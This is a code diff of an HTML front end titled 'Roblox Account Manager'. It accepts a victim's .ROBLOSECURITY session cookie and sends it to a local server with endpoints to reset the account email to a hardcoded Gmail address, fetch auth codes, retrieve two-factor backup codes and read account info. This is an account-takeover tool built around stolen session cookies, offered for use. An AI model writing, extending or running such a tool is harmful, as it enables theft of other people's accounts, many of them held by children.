@@ -1,13 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Roblox Account Email Reset</title>
+  <title>Roblox Account Manager</title>
+  <style>
+    body { bgcolor: white; font-family: Arial, sans-serif; }
+    .container { max-width: 500px; margin: 20px auto; }
+    button { margin: 5px; padding: 10px; }
+  </style>
 </head>
-<body bgcolor="white">
-  <h1>Roblox Account Email Reset</h1>
-  <input type="text" id="cookieInput" placeholder="Enter .ROBLOSECURITY cookie">
-  <input type="text" id="newEmail" placeholder="New email address" value="fpskozy2@gmail.com">
-  <button onclick="resetEmail()">Reset Email</button>
+<body>
+  <div class="container">
+    <h1>Roblox Account Manager</h1>
+    <input type="text" id="cookieInput" placeholder="Enter .ROBLOSECURITY cookie" style="width: 100%; padding: 5px;">
+    <input type="text" id="currentEmail" value="fpskozy2@gmail.com" readonly style="width: 100%; padding: 5px; margin-top: 10px;">
+    <input type="text" id="newEmail" placeholder="New email address" style="width: 100%; padding: 5px;">
+    <button onclick="resetEmail()">Reset Email</button>
+    <button onclick="validateCookie()">Validate Cookie</button>
+    <button onclick="getAuthCode()">Get Auth Code</button>
+    <button onclick="getBackupCodes()">Get Backup Codes</button>
+    <button onclick="checkAccountInfo()">Check Account Info</button>
+    <div id="result" style="margin-top: 10px;"></div>
+  </div>
   <script>
     async function resetEmail() {
       const cookie = document.getElementById('cookieInput').value;
@@ -17,7 +30,39 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ cookie, newEmail })
       });
-      alert(await response.text() || 'Reset failed');
+      document.getElementById('result').innerText = await response.text() || 'Reset failed';
+    }
+    async function validateCookie() {
+      const cookie = document.getElementById('cookieInput').value;
+      const response = await fetch(`http://localhost:3000/api/validate-cookie?cookie=${cookie}`);
+      document.getElementById('result').innerText = await response.text();
+    }
+    async function getAuthCode() {
+      const cookie = document.getElementById('cookieInput').value;
+      const response = await fetch('http://localhost:3000/api/get-auth-code', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cookie })
+      });
+      document.getElementById('result').innerText = await response.text();
+    }
+    async function getBackupCodes() {
+      const cookie = document.getElementById('cookieInput').value;
+      const response = await fetch('http://localhost:3000/api/get-backup-codes', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cookie })
+      });
+      document.getElementById('result').innerText = await response.text();
+    }
+    async function checkAccountInfo() {
+      const cookie = document.getElementById('cookieInput').value;
+      const response = await fetch('http://localhost:3000/api/check-account', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cookie })
+      });
+      document.getElementById('result').innerText = await response.text();
     }
   </script>
 </body>
